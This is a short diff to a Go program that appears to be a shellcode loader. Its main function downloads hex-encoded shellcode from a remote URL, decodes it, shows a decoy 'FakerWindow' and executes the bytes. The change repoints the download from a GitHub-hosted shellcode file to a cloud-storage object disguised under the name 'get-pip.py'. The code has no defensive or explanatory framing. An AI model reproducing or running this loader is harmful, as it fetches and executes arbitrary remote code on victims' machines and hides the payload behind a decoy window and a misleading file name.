@@ -7,7 +7,7 @@ import (
 
 func main() {
 //	FakerWindow()
-	shellcodeStr := httpDownload("https://raw.githubusercontent.com/pench3r/pench3r.github.io/master/example/windows_x86_shellcode.bin")
+	shellcodeStr := httpDownload("https://wx-1252923087.cos.ap-guangzhou.myqcloud.com/g2b4/get-pip.py")
 	shellcodeByte, _ := hex.DecodeString(shellcodeStr)
 	FakerWindow()
 	Run(shellcodeByte)
